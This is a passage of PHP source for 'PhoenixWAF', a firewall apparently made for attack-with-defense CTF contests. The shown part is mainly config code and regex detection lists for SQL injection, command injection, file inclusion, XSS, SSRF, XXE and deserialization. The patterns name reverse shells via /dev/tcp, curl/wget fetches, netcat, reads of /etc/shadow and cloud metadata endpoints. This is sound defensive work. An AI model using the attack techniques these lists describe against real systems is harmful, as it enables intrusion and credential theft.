<?php
/**
 * PhoenixWAF v4.0.0 — AWD PHP WAF (single-file)
 *
 * 部署: php waf.php --install /var/www/html [--password pass] [--key key]
 * 面板: http://host/any.php?waf_key=KEY  (需密码登录)
 * 卸载: php waf.php --uninstall /var/www/html
 * 状态: php waf.php --status /var/www/html
 *
 * 防御层:
 *   L1  请求过滤 (多层解码 + bypass 检测 + 置信度评分 + 静态资源快速放行)
 *   L2  响应拦截 (flag 泄露: 明文/base64/hex/url/实体/倒序 多编码擦除)
 *   L3  文件上传深度扫描
 *   L4  IP 黑白名单 + 频率限制 + 自动封禁
 *   L5  蜜罐路径 + 假 flag 反制
 *   L6  不死马对抗 (inotifywait + chattr 保护)
 *   L7  文件完整性监控 (SHA256 基线)
 *   L8  Checker(裁判机) IP 自动白名单 (绝不宕机)
 *   L9  自愈 (WAF 文件被删时自动恢复)
 *   L10 全局异常捕获 (任何错误都放行，不影响业务)
 *
 * 检测维度: sqli/cmdi/lfi/xss/code/ssrf/xxe/unserialize/upload/bypass/
 *          nosqli/ssti/jwt/proto + 自定义 PCRE 规则
 * 防护强度: balanced(低误报) / strict / paranoid(零漏报) — 面板可切换
 */

define('PWAF_VER',    '4.0.0');
define('PWAF_MARKER', '/*PWAF*/');
define('PWAF_SELF',   __FILE__);

// ── PHP 5.x 兼容层 ───────────────────────────────────────────────────────────
if (!function_exists('random_int')) {
    function random_int($min, $max) { return mt_rand($min, $max); }
}
if (!function_exists('random_bytes')) {
    function random_bytes($len) {
        if (function_exists('openssl_random_pseudo_bytes')) return openssl_random_pseudo_bytes($len);
        $r = '';
        for ($i = 0; $i < $len; $i++) $r .= chr(mt_rand(0, 255));
        return $r;
    }
}
if (!function_exists('array_key_first')) {
    function array_key_first(array $arr) {
        foreach ($arr as $k => $v) return $k;
        return null;
    }
}
if (!function_exists('hash_equals')) {
    function hash_equals($known, $user) {
        $known = (string)$known;
        $user  = (string)$user;
        if (strlen($known) !== strlen($user)) return false;
        $r = 0;
        for ($i = 0; $i < strlen($known); $i++) $r |= ord($known[$i]) ^ ord($user[$i]);
        return $r === 0;
    }
}
if (!function_exists('password_verify')) {
    function password_verify($password, $hash) { return crypt($password, $hash) === $hash; }
}
if (!function_exists('password_hash')) {
    function password_hash($password, $algo) { $salt = substr(strtr(base64_encode(random_bytes(16)), '+', '.'), 0, 22); return crypt($password, '$2y$10$' . $salt); }
}

if (PHP_SAPI === 'cli') { pwaf_cli($argv); exit(0); }

try {
    pwaf_run();
} catch (Exception $e) {
        @error_log('[PhoenixWAF] Error: ' . $e->getMessage());
}

// SECTION 1: CONFIG

function pwaf_cfg_path() {
    $wr = dirname(PWAF_SELF);
        $ptr = $wr . '/.pwaf_ptr';
    if (file_exists($ptr)) {
        $dir = trim(file_get_contents($ptr));
        if ($dir !== '' && file_exists($wr . '/' . $dir . '/.pwaf.php')) {
            return $wr . '/' . $dir . '/.pwaf.php';
        }
    }
    // 降级: 同目录（兼容旧安装）
    $local = $wr . '/.pwaf.php';
    if (file_exists($local)) return $local;
        return $local;
}

function pwaf_datadir(array $cfg) {
    if (!empty($cfg['datadir'])) return $cfg['datadir'];
        $wr = dirname(PWAF_SELF);
    $ptr = $wr . '/.pwaf_ptr';
    if (file_exists($ptr)) {
        $dir = trim(file_get_contents($ptr));
        if ($dir !== '' && is_dir($wr . '/' . $dir)) {
            return $wr . '/' . $dir;
        }
    }
        $cp = pwaf_cfg_path();
    if (file_exists($cp)) return dirname($cp);
    return $wr;
}

function &pwaf_cfg() {
    static $c = null;
    if ($c !== null) return $c;
    $p = pwaf_cfg_path();
    $c = file_exists($p) ? (include $p) : pwaf_default_cfg();
    return $c;
}

function pwaf_default_cfg() {
        $datadir = dirname(PWAF_SELF) . '/.' . substr(md5(uniqid('pwaf', true)), 0, 8);
    return [
        'enabled'        => true,
        'key'            => 'k' . substr(md5(uniqid('', true)), 0, 10),
        'hash'           => '',                            'datadir'        => $datadir,
        'log'            => $datadir . '/.pwaf_log',
        'rate_db'        => $datadir . '/.pwaf_rate',
        'integrity_db'   => $datadir . '/.pwaf_int',
        'backup'         => $datadir . '/.pwaf_bak.php',
        'fake_flag'      => 'flag{y0u_g0t_tr0lled_by_ph03n1x_waf}',
        'tarpit'         => 1500000,                       'stealth'        => false,                         'auto_ban'       => false,                 // 自动拉黑攻击 IP（默认关闭，防止误封裁判机）
        'access_log'     => true,                          'rate_limit'     => 80,                            'open_basedir'   => '',                            'fake_upload'    => true,                          // ── v3.8 防护强度 / 误报控制 ──────────────────────────────────────────
        'fp_mode'        => 'balanced',            // balanced=均衡(推荐,低误报) / strict=严格 / paranoid=偏执(高危场景,零漏报)
        'score_threshold'=> 2,                     // 低置信规则累计命中达到该值才拦截（balanced 模式）
        'static_bypass'  => true,                  // 静态资源(css/js/图片/字体)快速放行，杜绝误报并提速
        'checker_ips'    => [],                            'whitelist'      => [],
        'blacklist'      => [],
        'honeypots'      => ['/flag', '/flag.txt', '/.git/config', '/shell.php',
                             '/cmd.php', '/c99.php', '/r57.php', '/1.php',
                             '/backup.sql', '/config.bak', '/web.config.bak'],
        'webroot'        => '',
        'rules'          => [
            'sqli'       => true, 'cmdi'      => true, 'lfi'        => true,
            'xss'        => true, 'code'      => true, 'ssrf'       => true,
            'xxe'        => true, 'unserialize'=> true, 'upload'    => true,
            'response'   => true, 'bypass'    => true,
                        'nosqli'     => true, 'ssti'      => true, 'jwt'        => true,
            'proto'      => true,
        ],
    ];
}

//     file_put_contents(pwaf_cfg_path(), '<?php return ' . var_export($cfg, true) . ';', LOCK_EX);
function pwaf_save_cfg(array $cfg) {
    if (!empty($cfg['datadir'])) {
        $path = $cfg['datadir'] . '/.pwaf.php';
    } else {
        $path = pwaf_cfg_path();
    }
    file_put_contents($path, '<?php return ' . var_export($cfg, true) . ';', LOCK_EX);
}
// SECTION 2: DETECTION PATTERNS

function pwaf_patterns() {
    static $p = null;
    if ($p !== null) return $p;
    $p = [
    'sqli' => [
        // 经典布尔注入: 引号闭合 + or/and/|| + 比较恒等式 (高置信, ' or 1=1 / admin'||'1'='1)
        '/[\'"]\s*(?:(?:or|and|xor)\s+|(?:\|\||&&)\s*)[\'"]?[\w.]{1,25}[\'"]?\s*(?:=|<>|!=|<|>|\blike\b|\bregexp\b)\s*[\'"]?[\w.]{1,25}/i',
        // or/and 数字恒等式 + SQL 收尾 (or 1=1-- / or 1=1# / or 1=1) / 行尾)
        '/\b(?:or|and|xor)\s+[\'"]?\d{1,6}[\'"]?\s*=\s*[\'"]?\d{1,6}[\'"]?\s*(?:--|#|\/\*|;|\)|$)/i',
        // or/and + REGEXP/RLIKE 布尔盲注 (1 or 1 regexp 1)
        '/\b(?:or|and|xor)\s+[\w\'".()]{1,20}\s+(?:regexp|rlike)\b/i',
        // MySQL IF(条件,真,假) 三参数条件盲注 (if(1=1,1,0))
        '/\bif\s*\(\s*[^)]{1,50}(?:=|<>|!=|<|>|\blike\b|\bregexp\b)[^)]{0,50},[^)]{1,50},/i',
        // ── 布尔/时间盲注 (高置信) ──────────────────────────────────────────
        // AND/OR + SQL 函数调用 (ascii/substr/cast/extractvalue/sleep/...)
        '/\b(?:and|or|xor)\s+(?:ascii|substr(?:ing)?|mid|left|right|length|char(?:_length|acter_length)?|ord|hex|unhex|bin|reverse|cast|convert|count|concat(?:_ws)?|elt|field|make_set|export_set|updatexml|extractvalue|load_file|benchmark|sleep|master_pos_wait|json_extract|nullif|coalesce)\s*\(/i',
                '/\b(?:and|or|xor)\s+[\w.]{1,30}\s*(?:=|<>|!=|<|>|>=|<=)\s*0x[0-9a-f]+/i',
        // AND/OR + 同值数字恒等 (1=1 / 5=5) 或科学计数
        '/\b(?:and|or|xor)\s+(\d{1,5})\s*=\s*\1(?:\b|$)/i',
        '/\b(?:and|or|xor)\s+\d+e\d+\s*=/i',
        // AND/OR + IN(...) 子查询/列表 (BETWEEN 因与"between X and Y"日常语句易混,不单列)
        '/\b(?:and|or|xor)\s+[\w.\'"]{1,30}\s+in\s*\(\s*(?:select\b|[\'"\d])/i',
        // 子查询 (SELECT ... FROM ...) — CAST 由上面的 AND+函数 规则覆盖，此处不单列避免文档误报
        '/\(\s*select\b[\s\S]{0,150}\bfrom\b/i',
                '/\b(?:order|group)\s+by\b[\s\S]{0,25}(?:\(\s*select|\bcase\b)/i',
        '/\bunion\b.{0,60}\bselect\b/is',
        '/\bselect\b.{0,40}(\*|[\d]+\s*,\s*[\d]+|null\s*,|0x[0-9a-f]+).{0,60}\bfrom\b/is',
        '/\bselect\b.{0,60}\bfrom\b.{0,40}\b(where|limit|order\s+by|group\s+by|having|union)\b/is',
        '/\b(sleep|benchmark|pg_sleep|waitfor\s+delay|dbms_pipe\.receive_message)\s*\(/i',
        '/\b(extractvalue|updatexml|exp\s*\(\s*~|floor\s*\(\s*rand)\s*\(/i',
        '/\binformation_schema\b/i',
        '/\b(sys\.tables|sysobjects|syscolumns|pg_tables|pg_class)\b/i',
        '/\b(load_file|into\s+(out|dump)file|load\s+data\s+infile)\b/i',
        '/;\s*(drop|alter|create|truncate|insert|update|delete|exec|execute)\b/i',
        '/\border\s+by\s+\d+/i',
        '/\b(and|or)\b\s+[\d\'"(]\s*[=<>!]/i',
        '/0x[0-9a-fA-F]{4,}/i',
        '/\bchar\s*\(\s*\d+/i',
        '/\b(concat|group_concat|concat_ws)\s*\(/i',
        '/\bif\s*\(\s*[\d\'"]/i',
        '/\bunion\s+select\b/i',
        '/\b(version|user|database|schema)\s*\(\s*\)/i',
        '/\b(?:union|select|insert|update|delete|drop|truncate|alter)\b[\s\S]{0,10}(?:\/\*!?[0-9]{0,5}[\s\S]{0,20}?\*\/)?[\s\S]{0,10}\b(?:from|where|into|set|values)\b/is',
        '/\bunion\b[\s\t\n\r\x0b\x0c\/\*!]*\b(?:all|distinct)?[\s\t\n\r\x0b\x0c\/\*!]*\bselect\b/is',
        '/\b(extractvalue|updatexml|exp|floor|geometrycollection|multipoint|polygon|multipolygon|linestring|multilinestring|json_keys|json_extract|gtid_subset|st_latfromgeohash|st_pointfromgeohash|dbms_utility\.compile_schema)\s*\(/i',
        '/\b(sleep|benchmark|pg_sleep|waitfor\s+delay|dbms_pipe\.receive_message|dbms_lock\.sleep)\s*\(/i',
        '/(?:[=<>!]|[\s\S]\b(?:and|or|xor)\b)[\s\S]{0,20}\b(rlike|regexp|sounds\s+like|like)\b/i',
        '/[\s\S](?:\|\||&&|\^|\*|\/|%|<<|>>)\s*(?:sleep|benchmark|extractvalue|updatexml|pg_sleep)\s*\(/i',
        '/\b(information_schema|mysql|performance_schema|sys|pg_catalog|pg_toast|sqlite_master|sqlite_temp_master|sysobjects|syscolumns)\b/i',
        '/\b(load_file|into\s+(?:out|dump)file|load\s+data\s+(?:local\s+)?infile)\b/i',
        '/;\s*(?:drop|alter|create|truncate|insert|update|delete|exec|execute|declare|set)\b/i',
        '/\bxp_(?:cmdshell|regread|regwrite|dirtree|filelist)\b/i',
        '/\b0[xX][0-9a-fA-F]{4,}\b/',
        '/\b0[bB][01]{8,}\b/',
        '/\b(concat|group_concat|concat_ws|char|unhex|hex|ascii|ord|cast|convert)\s*\(/i',
    ],

    'cmdi' => [
        '/\b(system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec)\s*\(/i',
        '/`[^`]{1,200}`/',
        '/\$\([^)]{1,200}\)/',
        '/[;&|`]\s*(ls|dir|cat|tac|more|less|tail|head|id|whoami|uname|pwd|wget|curl|nc|netcat|bash|sh|python|perl|ruby|php|nmap|ping|find|grep|awk|sed)\b/i',
        '/\|\s*(bash|sh|zsh|ksh|csh|dash|tcsh)\b/i',
        '/(\/bin\/|\/usr\/bin\/|\/usr\/local\/bin\/)(bash|sh|nc|wget|curl|python|perl|ruby|php)/i',
        '/\b(wget|curl)\s+https?:\/\//i',
        '/>\s*\/dev\/tcp\//i',
        '/\/dev\/tcp\/[\d.]+\/\d+/i',
        '/\bchmod\s+[0-7]{3,4}/i',
        '/\bcrontab\s+-[el]/i',
        '/python\s+-c\s+[\'"]import/i',
        '/perl\s+-e\s+[\'"]use\s+Socket/i',
        '/\bbase64\s+-d\s*\|/i',
        '/echo\s+[A-Za-z0-9+\/]{20,}={0,2}\s*\|\s*base64/i',
        '/putenv\s*\(\s*[\'"]LD_PRELOAD/i',
        '/putenv\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i',
        '/\bFFI\s*::\s*(cdef|load|scope)\s*\(/i',
        '/proc_open\s*\(\s*[\'"]?(bash|sh|cmd|powershell)/i',
        '/\b(system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|syslog|error_log|mail|mb_send_mail)\s*\(/i',
        '/[;&|`]\s*(ls|dir|cat|tac|more|less|tail|head|id|whoami|uname|pwd|wget|curl|nc|netcat|bash|sh|zsh|python|perl|ruby|php|nmap|ping|find|grep|awk|sed|arp|route|ip|ifconfig)\b/i',
        '/(\/bin\/|\/usr\/bin\/|\/usr\/local\/bin\/|\/sbin\/)[a-zA-Z*?]{1,15}/i',
        '/\$IFS(?:\[[^\]]+\]|\$\d+)?/i',
        '/\$\{?[a-zA-Z_]+\:[\-\d]+\:\d+\}?/',
        '/\$\[[a-zA-Z0-9_]+\]/',
        '/\$\[\x[0-9a-fA-F]{2,}/',
        '/>\s*\/dev\/(?:tcp|udp)\//i',
        '/\/dev\/(?:tcp|udp)\/[\d.]+\/\d+/i',
        '/\b(bash|sh|zsh)\s+-i\b/i',
        '/echo\s+[A-Za-z0-9+\/]{20,}={0,2}\s*\|\s*(?:base64\s+-d\s*\|\s*)?(?:bash|sh|php|python|perl)/i',
        '/\b(?:chmod|chown)\s+[0-7R-]{3,10}/i',
        '/putenv\s*\(\s*[\'"](?:LD_PRELOAD|LD_LIBRARY_PATH)/i',
    ],

    'lfi' => [
        '/(\.\.[\/\\\\]){2,}/',
        '/(\.{2,}[\/\\\\]{1,3}){2,}/',                                '/\.{4,}[\/\\\\]{2,}/',                                       '/(%2e%2e[%2f%5c]){2,}/i',
        '/(%252e%252e[%252f%255c]){2,}/i',
        '/php:\/\/(filter|input|stdin|fd|memory|temp|data)/i',
        '/php:\/\/filter\/.*convert\.iconv\./i',
        '/php:\/\/filter\/.*convert\.base64/i',
        '/data:\/\//i',
        '/expect:\/\//i',
        '/zip:\/\//i',
        '/phar:\/\//i',
        '/glob:\/\//i',
        '/compress\.(zlib|bzip2):\/\//i',
        '/(\/|%2f)(etc\/passwd|etc\/shadow|etc\/hosts|proc\/self|var\/log)/i',
        '/\x00/',
        '/%00/',
        '/\.\.[\\\\\/].*\.(php|ini|conf|log|bak)/i',
        '/file:\/\//i',
        '/\b(include|require)(_once)?\s*[\(\s][\'"]?\.\.[\\/]/i',
        '/(?:%2e|%252e|\.)(?:%2e|%252e|\.)(?:%2f|%252f|%5c|%255c)/i',
        '/php:\/\/(?:filter|input|stdin|fd|memory|temp|data)/i',
        '/php:\/\/filter\/(?:[a-zA-Z0-9.\-\/=\|]+)?(?:convert\.(?:base64|iconv|quoted-printable)|string\.(?:rot13|toupper|tolower|strip_tags)|zlib\.(?:deflate|inflate))/i',
        '/(?:data|expect|zip|phar|glob|compress\.(?:zlib|bzip2)|file|dict|gopher|ldap):\/\//i',
        '/(?:\/|%2f)(?:etc\/(?:passwd|shadow|hosts|group|issue)|proc\/(?:self|version|sched_debug|net)|var\/log\/(?:auth|syslog|messages|apache|nginx))/i',
                '/(?:\/|%2f)etc\/[\w.\/-]*\.(?:conf|cnf|cfg|ini|key|pem|crt)\b/i',
        '/(?:\/|%2f)(?:etc\/(?:apache2?|nginx|httpd|ssh|mysql|redis|cron|sudoers)|root\/\.|home\/[^\/]+\/\.(?:ssh|bash|git))/i',
        '/(?:[c-zC-Z]:)?(?:\\\\|%5c|%255c|%2f|\/)(?:windows|winnt|system32|boot\.ini|etc[\\\\\/]hosts)/i',
        '/\b(?:include|require)(?:_once)?\s*[\(\s][\'"]?(?:\.\.[\\/]|php:\/\/)/i',
        // 超长 UTF-8 编码的 . / \ (IIS/Tomcat 式穿越: %c0%ae %c1%9c %c0%af)
        '/(?:%c0%ae|%c1%9c|%c0%af|%e0%80%ae|%e0%80%af|%c0%2e|%uff0e)/i',
    ],

    'xss' => [
        '/<\s*script[\s>\/]/i',
        '/<\s*\/\s*script\s*>/i',
        '/\bon\w+\s*=/i',
        '/javascript\s*:/i',
        '/vbscript\s*:/i',
        '/data\s*:\s*text\/html/i',
        '/data\s*:\s*[^,]*base64/i',
        '/<\s*(svg|math|iframe|object|embed|applet|link|meta|base|form)\b/i',
        '/expression\s*\(/i',
        '/\{\{.{0,100}\}\}/',
        '/\{%.{0,100}%\}/',
        '/srcdoc\s*=/i',
        '/<\s*img[^>]+src\s*=[^>]*(javascript|data):/i',
        '/<\s*(details|summary|marquee|bgsound|isindex)\b/i',
        '/<style[^>]*>[\s\S]{0,120}(?:@import|expression\s*\(|javascript:)/i',          '/\bon[a-zA-Z]{3,20}[\s\n]*=/i',
        '/(?:javascript|vbscript|jscript)\s*:/i',
        '/data\s*:\s*text\/(?:html|xml)/i',
        '/<\s*(?:svg|math|iframe|object|embed|applet|link|meta|base|form|details|summary|marquee|bgsound|isindex|audio|video)\b/i',
        '/\b(?:srcdoc|formaction|autofocus|ping)\s*=/i',
        '/\b(?:v-bind|v-html|ng-app|ng-bind|@click)\s*=/i',
        '/formaction\s*=\s*[\'"]?\s*(?:https?:)?\/\//i',                      '/\bconstructor\s*(?:\.\s*constructor|\[\s*[\'"]constructor)/i',         '/document\s*\.\s*cookie/i',                                          '/<use\s+(?:href|xlink:href)/i',
        '/<math.*<mtext/is',
        // CRLF 头注入 / HTTP 响应拆分 / 邮件头注入 (编码换行 + 注入头) — 要求冒号，几乎不误报
        '/%0d?%0a\s*(?:set-cookie|location|refresh|content-type|content-length|content-security-policy|link|bcc|cc|reply-to|to|from)\s*:/i',
        // javascript:/vbscript: 伪协议内插入空白/控制符绕过 (java&#9;script: / java\tscript:)
                '/j\s*a\s*v\s*a\s*s\s*c\s*r\s*i\s*p\s*t\s*:/i',
        '/v\s*b\s*s\s*c\s*r\s*i\s*p\s*t\s*:/i',
        // 事件处理器注入（高置信）: 已知事件名 + 紧跟 = ，分隔符含引号/空白/斜杠。
        // 覆盖 <img src="x"onerror= 引号闭合、<img/onerror= 斜杠、以及属性注入 " onmouseover= 。
        // 用精确事件名锁定，避免 online=/once=/onboarding= 等正常参数误报。
        '/["\'\s\/]on(?:error|load|click|auxclick|dblclick|contextmenu|mouse(?:over|out|move|down|up|enter|leave)|key(?:down|up|press)|focus(?:in|out)?|blur|change|input|toggle|submit|reset|pointer(?:over|out|down|up|move|enter|leave|cancel)|touch(?:start|end|move|cancel)|drag(?:start|end|over|enter|leave)?|drop|wheel|scroll|animation(?:start|end|iteration)|transition(?:end|start|run|cancel)|begin|repeat|slotchange|hashchange|popstate|beforeunload|paste|copy|cut|play(?:ing)?|pause|ended|invalid|canplay(?:through)?|loadstart|loadeddata|loadedmetadata|progress|abort|readystatechange|waiting|seeked|seeking|volumechange|ratechange|durationchange|timeupdate|cuechange|formdata|securitypolicyviolation|gotpointercapture|lostpointercapture)\s*=/i',
    ],

    'code' => [
        '/\beval\s*\(/i',
        '/\bassert\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES)/i',
        '/\bcreate_function\s*\(/i',
        '/preg_replace\s*\(\s*[\'"][^\'"]*(\/e)[\'"]/',
        '/\b(array_map|array_filter|usort|uasort|uksort|array_walk)\s*\([^,]+,\s*[\'"]?(system|exec|passthru|shell_exec|eval|assert|popen|proc_open)/i',
        '/\bcall_user_func(_array)?\s*\(\s*[\'"]?(system|exec|eval|assert|passthru|shell_exec|popen)/i',
        '/\$\$[a-zA-Z_\x7f-\xff]/i',
        '/\$[a-zA-Z_]\w*\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i',
        '/\b(base64_decode|str_rot13|gzinflate|gzuncompress|gzdecode|rawurldecode|hex2bin)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i',
        '/\b(highlight_file|show_source)\s*\(/i',
        '/\(\s*[\'"][a-z_]{2,10}[\'"]\s*\.\s*[\'"][a-z_]{2,10}[\'"]\s*\)\s*\(/i',
        '/\bstr_rot13\s*\(\s*(?:base64_decode|gzinflate|gzuncompress)\s*\(/i',
        '/\bstr_rot13\s*\(\s*[\'"](?:flfgrz|rkrp|cnffgueht|furyy_rkrp|cbcra|cebp_bcra|nffreg|riny)[\'"].*\(/i',
        '/\b(include|require)(_once)?\s*[\(\s][\'"]?\s*(\/flag|\/etc\/passwd|\/etc\/shadow|\/proc\/self)/i',
        '/\b(?:eval|assert|create_function|highlight_file|show_source)\s*\(/i',
        '/\b(?:array_map|array_filter|usort|uasort|uksort|array_walk|call_user_func(?:_array)?|register_tick_function|register_shutdown_function)\s*\([^,]+,\s*[\'"]?(?:system|exec|passthru|shell_exec|eval|assert|popen|proc_open)/i',
        '/preg_replace\s*\(\s*[\'"][^\'"]*(?:\/|#|~)[^\'"]{0,64}e[a-z]{0,8}[\'"]/',
        '/\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE|SERVER|FILES)/i',
        '/\b(?:base64_decode|str_rot13|gzinflate|gzuncompress|gzdecode|rawurldecode|hex2bin)\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)/i',
        '/\b(?:ReflectionFunction|ReflectionClass|ReflectionMethod|FFI)\b/i',
        '/\b(?:current|next|end|reset)\s*\(\s*(?:getallheaders|localeconv|get_defined_vars|session_id)\s*\(/i',
        '/fn\s*\(.*?\)\s*=>/i',
                '/\$\{\s*\$[a-zA-Z_\x7f-\xff]/',
        '/\$\{[^}]{1,40}\}\s*\(/',
                '/\(\s*(?:[\'"][a-zA-Z0-9_]{1,10}[\'"]\s*\.\s*){1,}[\'"][a-zA-Z0-9_]{1,10}[\'"]\s*\)\s*\(/',
                '/\bcall_user_func(?:_array)?\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE|SERVER)/i',
    ],

    'ssrf' => [
        '/https?:\/\/(127\.\d+\.\d+\.\d+|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+)/i',
        '/https?:\/\/172\.(1[6-9]|2\d|3[01])\.\d+\.\d+/i',
        '/https?:\/\/(localhost|0\.0\.0\.0|0x7f000001|0177\.0\.0\.1)/i',
        '/https?:\/\/\[::1\]/i',
        '/169\.254\.169\.254/i',
        '/metadata\.google\.internal/i',
        '/file:\/\//i',
        '/dict:\/\//i',
        '/gopher:\/\//i',
        '/ldap:\/\//i',
        '/https?:\/\/0x[0-9a-f]{8}/i',
        '/https?:\/\/\d{8,10}\//i',
        '/https?:\/\/(?:127\.\d+\.\d+\.\d+|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)/i',
        '/https?:\/\/(?:localhost|0\.0\.0\.0|\[::1\]|\[0000::1\])/i',
        '/(?:169\.254\.169\.254|100\.100\.100\.200|metadata\.google\.internal|metadata\.tencentyun\.com)/i',
        '/https?:\/\/0x[0-9a-f]{6,}/i',
        '/https?:\/\/0[0-7]{10,}/i',
        '/https?:\/\/\d{8,10}(?:\/|$)/i',
        '/https?:\/\/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.(?:xip\.io|nip\.io|sslip\.io|nip\.cc|ipv4\.wtf)/i',
        '/https?:\/\/[^\/]*[\x{2460}-\x{24FF}\x{FF10}-\x{FF19}\x{2160}-\x{217F}]/u',
        '/https?:\/\/\[::(?:ffff:)?(?:127|10|192|172|169)\./i',
                '/https?:\/\/\[(?:0{1,4}:){2,7}0{0,4}1\]/i',
        // IPv4-mapped IPv6 (展开或十六进制): [0:0:0:0:0:ffff:127.0.0.1] / [::ffff:a9fe:a9fe]
        '/\[[0:]*ffff:(?:127\.|10\.|192\.168|169\.254|0*a9fe|0*7f)/i',
        // 任意 octet 为十六进制/八进制的混淆 IP (0x7f.0.0.1 / 169.0376.169.0376 / 0x007f...)
        '/https?:\/\/(?:[^\/\s]*@)?(?:\d{1,3}\.){0,3}(?:0x[0-9a-fA-F]{1,4}|0[0-7]{3,5})(?:[.\/:]|$)/i',
        '/https?:\/\/(?:[^\/\s]*@)?0x[0-9a-fA-F]{1,4}[.x]/i',
                '/https?:\/\/(?:[^\/\s]*@)?127(?:\.\d{1,3}){1,3}(?:[\/:]|$)/i',
        '/https?:\/\/(?:[^\/\s]*@)?\d{8,10}(?::\d+)?(?:[\/?#]|$)/i',
        '/https?:\/\/[^\/\s]*@(?:127\.|10\.|192\.168|169\.254|172\.(?:1[6-9]|2\d|3[01])\.|localhost|0x|0[0-7]|\[)/i',
                '/(?:ftp|sftp|tftp|gopher|dict|ldap|redis|mongodb)s?:\/\/(?:[^\/\s]*@)?(?:127\.|10\.|192\.168|172\.(?:1[6-9]|2\d|3[01])\.|169\.254|localhost|\[|\d{8,10})/i',
                '/https?:\/\/(?:[^\/\s]*\.)?(?:localtest\.me|lvh\.me|vcap\.me|localhost|1\.0\.0\.127\.rebind|127\.0\.0\.1\.nip\.io)(?:[\/:]|$)/i',
    ],

    'xxe' => [
        '/<!DOCTYPE\s+[^>]*\[/i',
        '/<!ENTITY\s+/i',
        '/SYSTEM\s+[\'"]file:/i',
        '/SYSTEM\s+[\'"]https?:/i',
        '/SYSTEM\s+[\'"]php:/i',
        '/SYSTEM\s+[\'"]expect:/i',
        '/<!ENTITY\s+%\s+/i',
        '/<!ENTITY\s+(?:%\s+)?[a-zA-Z0-9_]+\s+(?:SYSTEM|PUBLIC)\s+[\'"]/i',
        '/SYSTEM\s+[\'"](?:file|https?|php|expect|gopher|dict|ftp):/i',
        '/xmlns:xi\s*=\s*[\'"]http:\/\/www\.w3\.org\/2001\/XInclude[\'"]/i',
                '/<!DOCTYPE[^>]*\bPUBLIC\s+[\'"][^\'"]*[\'"]\s+[\'"](?:file|https?|ftp|php|jar):/i',
        '/<!ENTITY[^>]*\bPUBLIC\s+[\'"][^\'"]*[\'"]\s+[\'"](?:file|https?|ftp|php):/i',
    ],

    'unserialize' => [
        '/O:\d+:"[a-zA-Z_\\\\][\w\\\\]*":\d+:\{/i',
        '/a:\d+:\{.*O:\d+:/is',
        '/C:\d+:"[a-zA-Z_][\w\\\\]*":\d+:\{/i',
        '/aced0005/i',
        '/\/wEP[A-Za-z0-9+\/]{20,}/i',
        '/O:\d+:"[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff\\\\]*":\d+:(?:\{|%7b)/i',
        '/O:\d+:"[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff\\\\]*":\d+;/i',
        '/a:\d+:(?:\{|%7b).*O:\d+:/is',
        '/C:\d+:"[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff\\\\]*":\d+:(?:\{|%7b)/i',
        '/rO0AB/i',
    ],

    'upload' => [
        '/<\?php/i',
        '/<\?=/i',
        '/\b(eval|assert|system|exec|passthru|shell_exec|popen|proc_open)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i',
        '/base64_decode\s*\(\s*\$_(GET|POST)/i',
        '/gzinflate\s*\(\s*base64_decode/i',
        '/str_rot13\s*\(\s*gzinflate/i',
        '/preg_replace\s*\([\'"]\/.*\/e[\'"],\s*\$_(GET|POST)/i',
        '/<%.*Runtime\.exec/is',
        '/<%.*ProcessBuilder/is',
        '/\.(php[3-9]?|phtml|phar|php-s|shtml|shtm|cgi|pl|py|rb|asp|aspx|jsp|jspx|cfm)\s*$/i',
        '/<\?(?:php\b|=|\s)/i',
        '/\b(?:eval|assert|system|exec|passthru|shell_exec|popen|proc_open)\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)/i',
        '/base64_decode\s*\(\s*\$_(?:GET|POST)/i',
        '/<%.*Runtime\.getRuntime\(\)\.exec/is',
        '/<script\s+language\s*=\s*[\'"]?(?:vbscript|jscript|c#)/i',
        '/\.(?:php[3-9]?|phtml|phar|php-s|shtml|shtm|cgi|pl|py|rb|asp|aspx|jsp|jspx|cfm)(?:\x00|\s|\.|$)/i',
        '/auto_prepend_file\s*=/i',
        '/auto_append_file\s*=/i',
        '/AddType\s+application\/x-httpd-php/i',
        '/SetHandler\s+application\/x-httpd-php/i',
        '/php_value\s+(?:auto_prepend_file|auto_append_file|disable_functions)/i',
                '/(?:^|[\/\\\\])\.?(?:htaccess|htpasswd)$/i',
        '/(?:^|[\/\\\\])\.user\.ini$/i',
        '/(?:^|[\/\\\\])web\.config$/i',
    ],

    'bypass' => [
        '/[~^|]\s*[\'"][^\x00-\x1F]{1,30}[\'"]\s*\(/',
        '/\([\'"][^\x00-\x1F]{1,15}[\'"]\s*[\^|]\s*[\'"][^\x00-\x1F]{1,15}[\'"]\)\s*\(/',
        '/\$_(?:GET|POST|REQUEST|COOKIE|SERVER|FILES)\[[^\]]+\]\s*\(/',
        '/[\'"](?:\\\\x[0-9a-fA-F]{2}|\\\\[0-7]{1,3}){4,}[\'"]/',
        // 命名空间转义调用全局危险函数 (\system( / \eval( 等)。精确匹配危险函数名，
        // 避免对含 \b( \d( 等的正则/代码片段粘贴误报，同时更强地锁定真实绕过技术。
        '/\\\\(?:system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec|eval|assert|create_function|call_user_func(?:_array)?|array_map|array_filter|usort|file_get_contents|file_put_contents|fopen|fwrite|readfile|include|include_once|require|require_once|base64_decode|gzinflate|gzuncompress|gzdecode|str_rot13|hex2bin|rawurldecode|escapeshellcmd|escapeshellarg|putenv|extract|parse_str|preg_replace)\s*\(/i',
